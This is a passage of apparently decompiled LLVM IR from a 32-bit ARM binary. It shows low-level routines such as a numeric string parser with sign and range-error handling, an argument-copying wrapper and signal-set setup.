  %v9_1079c = and i32 %v8_1079c, %v1_1079c
  store i32 %v9_1079c, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10794, %.thread, %bb
  %v3_107a4 = load i32, i32* @r4, align 4
  store i32 %v3_107a4, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg4, i32* @r5, align 4
  %tmp31 = icmp ult i32 %arg3, 128
  br i1 %tmp31, label %dec_label_pc_107c4, label %dec_label_pc_107b4

dec_label_pc_107b4:                               ; preds = %.thread1
  %v2_107b4 = icmp ugt i32 %arg3, 254
  %v7_107b4 = icmp eq i32 %arg3, 255
  %v2_107b8 = xor i1 %v7_107b4, true
  %v3_107b8 = and i1 %v2_107b4, %v2_107b8
  br i1 %v3_107b8, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_107b4
  store i32 4, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_107b4, %bb22
  %v1_107ec9 = phi i32 [ %v3_107a4, %dec_label_pc_107b4 ], [ 4, %bb22 ]
  %v2_107bc = xor i1 %v2_107b4, true
  %v3_107bc = or i1 %v7_107b4, %v2_107bc
  br i1 %v3_107bc, label %bb24, label %bb28

bb24:                                             ; preds = %bb23
  store i32 3, i32* @r4, align 4
  br label %bb28

dec_label_pc_107c4:                               ; preds = %.thread1
  %tmp32 = icmp ugt i32 %arg3, 31
  br i1 %tmp32, label %dec_label_pc_107dc, label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_107c4
  %tmp33 = icmp ugt i32 %arg3, 7
  br i1 %tmp33, label %.thread12, label %dec_label_pc_10848

.thread12:                                        ; preds = %dec_label_pc_107cc
  store i32 0, i32* @r4, align 4
  br label %bb28

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107c4
  %v2_107dc = icmp ugt i32 %arg3, 62
  %v7_107dc = icmp eq i32 %arg3, 63
  %v2_107e0 = xor i1 %v7_107dc, true
  %v3_107e0 = and i1 %v2_107dc, %v2_107e0
  br i1 %v3_107e0, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_107dc
  store i32 2, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_107dc, %bb25
  %v1_107ec8 = phi i32 [ %v3_107a4, %dec_label_pc_107dc ], [ 2, %bb25 ]
  %v2_107e4 = xor i1 %v2_107dc, true
  %v3_107e4 = or i1 %v7_107dc, %v2_107e4
  br i1 %v3_107e4, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  store i32 1, i32* @r4, align 4
  br label %bb28

bb28:                                             ; preds = %.thread12, %bb24, %bb23, %bb26, %bb27
  %v1_107f4 = phi i32 [ 3, %bb24 ], [ %v1_107ec9, %bb23 ], [ %v1_107ec8, %bb26 ], [ 1, %bb27 ], [ 0, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_17a98.489 to i32), i32* %r2.global-to-local, align 4
  %v4_107ec = mul i32 %v1_107f4, 4
  %v5_107ec = add i32 %v4_107ec, ptrtoint (i32* @global_var_17a98.489 to i32)
  store i32 %v5_107ec, i32* %r3.global-to-local, align 4
  %v1_107f0 = add i32 %v4_107ec, add (i32 ptrtoint (i32* @global_var_17a98.489 to i32), i32 20)
  %v2_107f0 = inttoptr i32 %v1_107f0 to i32*
  %v3_107f0 = load i32, i32* %v2_107f0, align 4
  store i32 %v3_107f0, i32* %r1.global-to-local, align 4
  %v6_107f4 = inttoptr i32 %v5_107ec to i32*
  %v7_107f4 = load i32, i32* %v6_107f4, align 4
  store i32 %v7_107f4, i32* %r2.global-to-local, align 4
  %v1_107f8 = add i32 %tmp, 4
  store i32 %v1_107f8, i32* @r6, align 4
  %v4_107fc = mul i32 %v3_107f0, 4
  %v5_107fc = add i32 %v4_107fc, %v1_107f8
  store i32 %v5_107fc, i32* %r3.global-to-local, align 4
  %v2_10800 = add i32 %arg4, 24
  %v3_10800 = inttoptr i32 %v2_10800 to i32*
  store i32 %v5_107fc, i32* %v3_10800, align 4
  %v0_10804 = load i32, i32* %r2.global-to-local, align 4
  %v1_10804 = load i32, i32* @r5, align 4
  %v2_10804 = add i32 %v1_10804, 20
  %v3_10804 = inttoptr i32 %v2_10804 to i32*
  store i32 %v0_10804, i32* %v3_10804, align 4
  %v0_10808 = load i32, i32* %r1.global-to-local, align 4
  %v1_10808 = load i32, i32* @r5, align 4
  %v2_10808 = add i32 %v1_10808, 16
  %v3_10808 = inttoptr i32 %v2_10808 to i32*
  store i32 %v0_10808, i32* %v3_10808, align 4
  %v0_1080c = load i32, i32* @r4, align 4
  %v1_1080c = load i32, i32* @r5, align 4
  %v2_1080c = add i32 %v1_1080c, 12
  %v3_1080c = inttoptr i32 %v2_1080c to i32*
  store i32 %v0_1080c, i32* %v3_1080c, align 4
  %v0_10810 = load i32, i32* @r6, align 4
  %v1_10810 = load i32, i32* @r5, align 4
  %v2_10810 = add i32 %v1_10810, 8
  %v3_10810 = inttoptr i32 %v2_10810 to i32*
  store i32 %v0_10810, i32* %v3_10810, align 4
  %v0_10814 = load i32, i32* @r5, align 4
  store i32 %v0_10814, i32* %r1.global-to-local, align 4
  %v0_10818 = load i32, i32* @r0, align 4
  %v2_10818 = inttoptr i32 %v0_10818 to i32*
  %v3_10818 = call i32 @function_106d4(i32* %v2_10818, i32 %v0_10814)
  store i32 %v3_10818, i32* %r0.global-to-local, align 4
  %v0_1081c = load i32, i32* @r4, align 4
  %v2_1081c = icmp eq i32 %v0_1081c, 0
  br i1 %v2_1081c, label %bb29, label %.thread6

bb29:                                             ; preds = %bb28
  %v1_1083814 = load i32, i32* @r7, align 4
  %v2_1083815 = inttoptr i32 %v1_1083814 to i32*
  store i32 0, i32* %v2_1083815, align 4
  %v1_1083c = load i32, i32* @r4, align 4
  store i32 %v1_1083c, i32* %r0.global-to-local, align 4
  br label %bb30

.thread6:                                         ; preds = %bb28
  %v1_10820 = load i32, i32* @r5, align 4
  %v2_10820 = add i32 %v1_10820, 4
  %v3_10820 = inttoptr i32 %v2_10820 to i32*
  %v4_10820 = load i32, i32* %v3_10820, align 4
  %v1_10824 = load i32, i32* @r6, align 4
  %v3_10824 = sub i32 %v4_10820, %v1_10824
  %v4_10828 = sdiv i32 %v3_10824, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10830 = mul i32 %v4_10828, 5
  %v5_10830 = add i32 %v4_10830, %v0_1081c
  store i32 %v5_10830, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10838 = load i32, i32* @r7, align 4
  %v2_10838 = inttoptr i32 %v1_10838 to i32*
  store i32 0, i32* %v2_10838, align 4
  %v1_10840 = load i32, i32* %r3.global-to-local, align 4
  %v2_10840 = load i32, i32* @r7, align 4
  %v3_10840 = inttoptr i32 %v2_10840 to i32*
  store i32 %v1_10840, i32* %v3_10840, align 4
  %v17_10844.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %bb29, %.thread6
  %v17_10844 = phi i32 [ %v1_1083c, %bb29 ], [ %v17_10844.pre, %.thread6 ]
  %v2_10844 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10844, i32* %r4.global-to-local, align 4
  ret i32 %v17_10844

dec_label_pc_10848:                               ; preds = %dec_label_pc_107cc
  %v0_10848 = call i32 @function_cec4()
  store i32 %v0_10848, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_10850 = inttoptr i32 %v0_10848 to i32*
  store i32 22, i32* %v2_10850, align 4
  %v0_10854 = call i32 @function_cec4()
  %v0_10858 = load i32, i32* %r4.global-to-local, align 4
  %v2_10858 = inttoptr i32 %v0_10854 to i32*
  store i32 %v0_10858, i32* %v2_10858, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10860 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10860, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_107dc, { 1, 0 }
  uselistorder i1 %v7_107b4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 %arg3, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 4, 3, 0, 1, 2 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread1, { 2, 1, 0 }
}

define i32 @function_10868(i8* %arg1) local_unnamed_addr {
dec_label_pc_10868:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_1087c = load i32, i32* @r4, align 4
  store i32 %v3_1087c, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_108a0.pre = load i32, i32* @global_var_205f0, align 4
  br label %dec_label_pc_10898

dec_label_pc_10898:                               ; preds = %dec_label_pc_10898, %dec_label_pc_10868
  %v0_108d0 = phi i32 [ %tmp, %dec_label_pc_10868 ], [ %v1_10894, %dec_label_pc_10898 ]
  store i32 %v0_108d0, i32* %r4.global-to-local, align 4
  %v1_1089c = inttoptr i32 %v0_108d0 to i8*
  %v2_1089c = load i8, i8* %v1_1089c, align 1
  %v3_1089c = zext i8 %v2_1089c to i32
  %v3_108a4 = mul nuw nsw i32 %v3_1089c, 2
  %v4_108a4 = add i32 %v3_108a4, %v2_108a0.pre
  %v5_108a4 = inttoptr i32 %v4_108a4 to i8*
  %v6_108a4 = load i8, i8* %v5_108a4, align 1
  %v1_108a8 = and i8 %v6_108a4, 32
  %v2_108a8 = icmp eq i8 %v1_108a8, 0
  %v1_10894 = add i32 %v0_108d0, 1
  br i1 %v2_108a8, label %dec_label_pc_108b0, label %dec_label_pc_10898

dec_label_pc_108b0:                               ; preds = %dec_label_pc_10898
  %v7_108b0 = icmp eq i8 %v2_1089c, 43
  br i1 %v7_108b0, label %dec_label_pc_108d0, label %dec_label_pc_108b8

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108b0
  %v7_108b8 = icmp eq i8 %v2_1089c, 45
  br i1 %v7_108b8, label %dec_label_pc_108d0, label %bb

bb:                                               ; preds = %dec_label_pc_108b8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1092c

dec_label_pc_108d0:                               ; preds = %dec_label_pc_108b0, %dec_label_pc_108b8
  %storemerge30 = phi i32 [ 1, %dec_label_pc_108b8 ], [ 0, %dec_label_pc_108b0 ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_10894, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %bb, %dec_label_pc_108d0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_10934 = call i32 @function_ca30(i32 -1, i32 10)
  %v0_10938 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10938, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_10944 = urem i32 %v2_10934, 256
  store i32 %v1_10944, i32* %sl.global-to-local, align 4
  %v0_10948 = call i32 @function_14f20()
  store i32 0, i32* @ip, align 4
  store i32 %v0_10948, i32* %r8.global-to-local, align 4
  %v0_1095c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1095c

dec_label_pc_10958:                               ; preds = %bb48, %dec_label_pc_109b8
  %v0_10958 = phi i32 [ %v1_10988, %bb48 ], [ %v0_10958.pre, %dec_label_pc_109b8 ]
  store i32 %v0_10958, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_1092c, %dec_label_pc_10958
  %v0_10988 = phi i32 [ %v0_1095c.pre, %dec_label_pc_1092c ], [ %v0_10958, %dec_label_pc_10958 ]
  %v1_1095c = inttoptr i32 %v0_10988 to i8*
  %v2_1095c = load i8, i8* %v1_1095c, align 1
  %v3_1095c = zext i8 %v2_1095c to i32
  %v1_10960 = add nsw i32 %v3_1095c, -48
  %v1_10964 = urem i32 %v1_10960, 256
  %v1_1096c = or i32 %v3_1095c, 32
  %tmp56 = icmp ult i32 %v1_10964, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_1095c
  %tmp57 = icmp ugt i32 %v1_1096c, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10974
  %v1_10978 = add nsw i32 %v1_1096c, -87
  %v5_10980 = urem i32 %v1_10978, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_1095c, %dec_label_pc_10974, %bb42
  %v3_109b0 = phi i32 [ %v1_10964, %dec_label_pc_1095c ], [ 40, %dec_label_pc_10974 ], [ %v5_10980, %bb42 ]
  %v1_10984 = load i32, i32* %r5.global-to-local, align 4
  %v1_10988 = add i32 %v0_10988, 1
  store i32 %v1_10988, i32* %r4.global-to-local, align 4
  %v6_1098c = icmp slt i32 %v3_109b0, %v1_10984
  br i1 %v6_1098c, label %dec_label_pc_10990, label %dec_label_pc_109d0

dec_label_pc_10990:                               ; preds = %bb43
  %v0_10990 = load i32, i32* @ip, align 4
  %v1_10990 = load i32, i32* %r8.global-to-local, align 4
  %v9_10990 = icmp eq i32 %v0_10990, %v1_10990
  br i1 %v9_10990, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_10990
  br label %dec_label_pc_109a0

bb44:                                             ; preds = %dec_label_pc_10990
  %v3_10990 = icmp ult i32 %v0_10990, %v1_10990
  br i1 %v3_10990, label %dec_label_pc_109a0, label %dec_label_pc_109b8

dec_label_pc_109a0:                               ; preds = %bb44, %.thread
  %v4_109a81727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_109a0 = load i32, i32* %sl.global-to-local, align 4
  %v3_109a0 = icmp uge i32 %v3_109b0, %v1_109a0
  %v9_109a0 = icmp eq i32 %v3_109b0, %v1_109a0
  %v2_109a4 = xor i1 %v3_109a0, true
  %v3_109a4 = or i1 %v9_109a0, %v2_109a4
  br i1 %v3_109a4, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_109a0
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_109a0, %bb45
  %v4_109a8 = phi i32 [ %v4_109a81727, %dec_label_pc_109a0 ], [ 0, %bb45 ]
  %v2_109a8 = xor i1 %v9_109a0, true
  %v3_109a8 = and i1 %v3_109a0, %v2_109a8
  br i1 %v3_109a8, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_109a8 = urem i32 %v4_109a8, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_109ac = phi i32 [ %v5_109a8, %bb47 ], [ %v4_109a8, %bb46 ]
  %v2_109ac = icmp eq i32 %v0_109ac, 0
  br i1 %v2_109ac, label %bb48, label %dec_label_pc_109b8

bb48:                                             ; preds = %thread-pre-split
  %v4_109b0 = mul i32 %v0_10990, %v1_10984
  %v5_109b0 = add i32 %v4_109b0, %v3_109b0
  store i32 %v5_109b0, i32* @ip, align 4
  br label %dec_label_pc_10958

dec_label_pc_109b8:                               ; preds = %bb44, %thread-pre-split
  %v0_109b8 = call i32 @function_cec4()
  %v0_109bc = load i32, i32* %r7.global-to-local, align 4
  %v1_109bc = load i32, i32* %fp.global-to-local, align 4
  %v2_109bc = and i32 %v1_109bc, %v0_109bc
  store i32 %v2_109bc, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_109c8 = inttoptr i32 %v0_109b8 to i32*
  store i32 34, i32* %v2_109c8, align 4
  %v0_10958.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10958

dec_label_pc_109d0:                               ; preds = %bb43
  %v0_109d0.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_109d0 = icmp eq i32 %v0_109d0.pre, 0
  br i1 %v2_109d0, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_109d0
  %v1_109d4 = load i32, i32* %r6.global-to-local, align 4
  %v3_109d4 = inttoptr i32 %v0_109d0.pre to i32*
  store i32 %v1_109d4, i32* %v3_109d4, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_109d0, %bb49
  %v0_109d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_109d8 = icmp eq i32 %v0_109d8, 0
  %. = select i1 %v2_109d8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_109e4 = load i32, i32* %fp.global-to-local, align 4
  %v2_109e4 = icmp eq i32 %v0_109e4, 0
  %v0_10a08.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_109e4, label %dec_label_pc_10a00, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_10a08.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_109f0, label %dec_label_pc_10a00

dec_label_pc_109f0:                               ; preds = %bb53
  %v0_109f0 = call i32 @function_cec4()
  %v2_109f8 = inttoptr i32 %v0_109f0 to i32*
  store i32 34, i32* %v2_109f8, align 4
  %v0_109fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_109fc, i32* @ip, align 4
  %v0_10a00.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a00

dec_label_pc_10a00:                               ; preds = %bb53, %bb50, %dec_label_pc_109f0
  %v0_10a08.pre = phi i32 [ %v0_10a08.pre.pre, %bb53 ], [ %v0_109fc, %dec_label_pc_109f0 ], [ %v0_10a08.pre.pre, %bb50 ]
  %v0_10a00 = phi i32 [ %v0_109d8, %bb53 ], [ %v0_10a00.pre, %dec_label_pc_109f0 ], [ %v0_109d8, %bb50 ]
  %v2_10a00 = icmp eq i32 %v0_10a00, 0
  br i1 %v2_10a00, label %dec_label_pc_10a00._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_10a00
  %v2_10a04 = sub i32 0, %v0_10a08.pre
  store i32 %v2_10a04, i32* @ip, align 4
  br label %dec_label_pc_10a00._crit_edge

dec_label_pc_10a00._crit_edge:                    ; preds = %dec_label_pc_10a00, %bb54
  %v0_10a08 = phi i32 [ %v2_10a04, %bb54 ], [ %v0_10a08.pre, %dec_label_pc_10a00 ]
  %v2_10a0c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10a0c, i32* @r4, align 4
  ret i32 %v0_10a08

; uselistorder directives
  uselistorder i32 %v0_10a08.pre, { 1, 0 }
  uselistorder i32 %v0_10a08.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_109d0.pre, { 1, 0 }
  uselistorder i32 %v4_109a8, { 1, 0 }
  uselistorder i1 %v3_109a0, { 1, 0 }
  uselistorder i32 %v1_109a0, { 1, 0 }
  uselistorder i32 %v1_10988, { 1, 0 }
  uselistorder i32 %v1_1096c, { 1, 0 }
  uselistorder i32 %v1_10964, { 1, 0 }
  uselistorder i32 %v0_10958, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 -87, { 1, 0 }
  uselistorder label %dec_label_pc_10a00._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10a00, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_109b8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 1, 0 }
  uselistorder label %dec_label_pc_10958, { 1, 0 }
  uselistorder label %dec_label_pc_1092c, { 1, 0 }
  uselistorder label %dec_label_pc_108d0, { 1, 0 }
}

define i32 @function_10a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_10a14:
  %stack_var_-16 = alloca i32, align 4
  %v2_10a14 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_10a14, i32* @r0, align 4
  %v1_10a30 = call i32 @function_10d54()
  %v1_10a40 = call i32 @function_10d4c()
  %v2_10a48 = load i32, i32* @global_var_22c74.497, align 4
  %v2_10a4c = icmp eq i32 %v2_10a48, 0
  br i1 %v2_10a4c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_10a14
  call void @__pseudo_branch(i32 %v2_10a48)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10a14, %bb
  store i32 %v2_10a14, i32* @r0, align 4
  %v1_10a6c = call i32 @function_10d54()
  store i32 %v1_10a6c, i32* @r0, align 4
  %v1_10a70 = call i32 @function_10ce0(i32 %v1_10a6c)
  store i32 68228, i32* @lr, align 4
  %v2_10a80 = call i32 @function_d810()
  %v0_10a84 = load i32, i32* @r4, align 4
  %v1_10a88 = call i32 @function_11248(i32 %v0_10a84)
  unreachable

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_10aa8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10aa8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10aa8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10aa8, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_10ab8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_10abc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_10abc, i32* %stack_var_-32, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10ac8

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10ac8, %dec_label_pc_10aa8
  %v0_10adc = phi i32 [ %v1_10adc, %dec_label_pc_10ac8 ], [ 0, %dec_label_pc_10aa8 ]
  %v3_10ac8 = phi i32 [ %v1_10ad0, %dec_label_pc_10ac8 ], [ %v2_10abc, %dec_label_pc_10aa8 ]
  %v1_10acc = inttoptr i32 %v3_10ac8 to i32*
  %v2_10acc = load i32, i32* %v1_10acc, align 4
  %v1_10ad0 = add i32 %v3_10ac8, 4
  %v2_10ad4 = icmp eq i32 %v2_10acc, 0
  store i32 %v1_10ad0, i32* %stack_var_-32, align 4
  %v1_10adc = add i32 %v0_10adc, 1
  store i32 %v1_10adc, i32* %lr.global-to-local, align 4
  br i1 %v2_10ad4, label %dec_label_pc_10ae4, label %dec_label_pc_10ac8

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10ac8
  %v3_10ae4.neg = mul i32 %v1_10adc, -4
  %v1_10ae8.neg = add i32 %v2_10ab8, -8
  %v2_10aec = add i32 %v1_10ae8.neg, %v3_10ae4.neg
  %v2_10af4 = inttoptr i32 %v2_10aec to i32*
  store i32 %arg1, i32* %v2_10af4, align 4
  store i32 %v2_10abc, i32* %stack_var_-32, align 4
  %v0_10b00 = load i32, i32* @sp, align 4
  store i32 %v0_10b00, i32* @r1, align 4
  store i32 %v0_10b00, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10b08

dec_label_pc_10b08:                               ; preds = %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge, %dec_label_pc_10ae4
  %v1_10b1c = phi i32 [ %v5_10b1c, %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge ], [ %v0_10b00, %dec_label_pc_10ae4 ]
  %v3_10b08 = phi i32 [ %v3_10b08.pre, %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge ], [ %v2_10abc, %dec_label_pc_10ae4 ]
  %v1_10b0c = inttoptr i32 %v3_10b08 to i32*
  %v2_10b0c = load i32, i32* %v1_10b0c, align 4
  %v0_10b10 = load i32, i32* %lr.global-to-local, align 4
  %v1_10b10 = add i32 %v0_10b10, -1
  store i32 %v1_10b10, i32* %lr.global-to-local, align 4
  %v7_10b10 = icmp eq i32 %v0_10b10, 1
  %v1_10b14 = add i32 %v3_10b08, 4
  store i32 %v1_10b14, i32* %stack_var_-32, align 4
  %v2_10b1c = add i32 %v1_10b1c, 4
  %v3_10b1c = inttoptr i32 %v2_10b1c to i32*
  store i32 %v2_10b0c, i32* %v3_10b1c, align 4
  %v4_10b1c = load i32, i32* %ip.global-to-local, align 4
  %v5_10b1c = add i32 %v4_10b1c, 4
  store i32 %v5_10b1c, i32* %ip.global-to-local, align 4
  br i1 %v7_10b10, label %dec_label_pc_10b24, label %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge

dec_label_pc_10b08.dec_label_pc_10b08_crit_edge:  ; preds = %dec_label_pc_10b08
  %v3_10b08.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_10b08

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b08
  %v2_10b28 = load i32, i32* @global_var_22c7c.502, align 4
  store i32 %v2_10b28, i32* @r2, align 4
  %v0_10b2c = call i32 @function_1129c()
  ret i32 %v0_10b2c

; uselistorder directives
  uselistorder i32 %v5_10b1c, { 1, 0 }
  uselistorder i32 %v0_10b10, { 1, 0 }
  uselistorder i32 %v1_10adc, { 0, 2, 1 }
  uselistorder i32 %v1_10ad0, { 1, 0 }
  uselistorder i32 %v3_10ac8, { 1, 0 }
  uselistorder i32 %v2_10abc, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_10b3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b3c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10b3c = load i32, i32* @r4, align 4
  store i32 %v3_10b3c, i32* %stack_var_-20, align 4
  %v6_10b3c = load i32, i32* @r5, align 4
  %v9_10b3c = load i32, i32* @r6, align 4
  %v16_10b3c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_10b40 = icmp eq i32 %arg1, 0
  %v2_10b44 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_10b40, label %dec_label_pc_10cc8, label %dec_label_pc_10b5c.preheader

dec_label_pc_10b5c.preheader:                     ; preds = %dec_label_pc_10b3c
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_10b6417 = add i32 %v16_10b3c, 124
  br label %dec_label_pc_10b54

dec_label_pc_10b54:                               ; preds = %dec_label_pc_10b5c.preheader, %dec_label_pc_10b54
  %v5_10b6418 = phi i32 [ %v5_10b6417, %dec_label_pc_10b5c.preheader ], [ %v5_10b64, %dec_label_pc_10b54 ]
  %v2_10b58 = add i32 %v5_10b6418, -136
  %v3_10b58 = inttoptr i32 %v2_10b58 to i32*
  store i32 0, i32* %v3_10b58, align 4
  %v0_10b5c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10b5c = add i32 %v0_10b5c.pre, -1
  store i32 %v1_10b5c, i32* %r1.global-to-local, align 4
  %v6_10b5c = icmp slt i32 %v1_10b5c, 0
  %v4_10b64 = mul i32 %v1_10b5c, 4
  %v5_10b64 = add i32 %v4_10b64, %v16_10b3c
  br i1 %v6_10b5c, label %dec_label_pc_10b6c, label %dec_label_pc_10b54

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b54
  %v2_10b6c = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_10b6c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v0_10b7c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_10b7c, i32* %stack_var_-28, align 4
  %v2_10b84 = call i32 @function_13870(i32 %v2_10b6c, i32 17)
  store i32 %v2_10b84, i32* %r0.global-to-local, align 4
  %v1_10b88 = load i32, i32* @r5, align 4
  %v5_10b8c = icmp slt i32 %v2_10b84, %v1_10b88
  br i1 %v5_10b8c, label %dec_label_pc_10cd0, label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b6c
  %v2_10b90 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_10b90, i32* @r4, align 4
  store i32 %v1_10b88, i32* %r0.global-to-local, align 4
  store i32 %v2_10b6c, i32* %r1.global-to-local, align 4
  %v3_10ba0 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_10ba0 = call i32 @function_11494(i32 %v1_10b88, %_TYPEDEF_sigset_t* %v3_10ba0, i32 %v2_10b90)
  store i32 %v4_10ba0, i32* %r0.global-to-local, align 4
  %v1_10ba4 = load i32, i32* @r5, align 4
